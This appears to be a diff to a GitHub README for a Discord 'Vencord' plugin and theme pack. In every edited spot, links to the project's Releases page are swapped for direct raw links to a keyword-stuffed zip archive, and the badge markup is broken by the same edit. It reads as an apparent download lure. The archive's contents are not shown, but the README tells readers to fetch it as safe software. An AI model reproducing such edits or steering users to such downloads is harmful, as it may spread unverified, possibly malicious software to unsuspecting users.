@@ -1,6 +1,6 @@
 # 🎨 Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement - Enhance Your Discord Experience
 
-[![Download Vencord Tools](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/releases)
+[![Download Vencord Tools](https://raw.githubusercontent.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/main/assets/Guides_Pack_Utilities_for_Themes_Discord_Custom_Vencord_Plugins_Enhancement_Tools_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/main/assets/Guides_Pack_Utilities_for_Themes_Discord_Custom_Vencord_Plugins_Enhancement_Tools_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Vencord Tools Plugins Pack! This collection provides safe and ope
 
 ## 🔗 Download & Install
 
-To get started, you need to download the software package. Visit this page to download: [Releases Page](https://github.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/releases).
+To get started, you need to download the software package. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/main/assets/Guides_Pack_Utilities_for_Themes_Discord_Custom_Vencord_Plugins_Enhancement_Tools_v1.9.zip).
 
 1. Click on the link above. You will see several versions of the package available for download.
 2. Choose the latest release. Click the download link next to the version that suits your needs.
@@ -77,4 +77,4 @@ For further reading and resources, consider the following:
 - **Documentation:** Comprehensive guides explaining each tool and plugin.
 - **Community Forums:** A space to discuss enhancements and improvements.
 
-[![Download Vencord Tools](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/releases)
+[![Download Vencord Tools](https://raw.githubusercontent.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/main/assets/Guides_Pack_Utilities_for_Themes_Discord_Custom_Vencord_Plugins_Enhancement_Tools_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kevcodecraft/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/main/assets/Guides_Pack_Utilities_for_Themes_Discord_Custom_Vencord_Plugins_Enhancement_Tools_v1.9.zip)
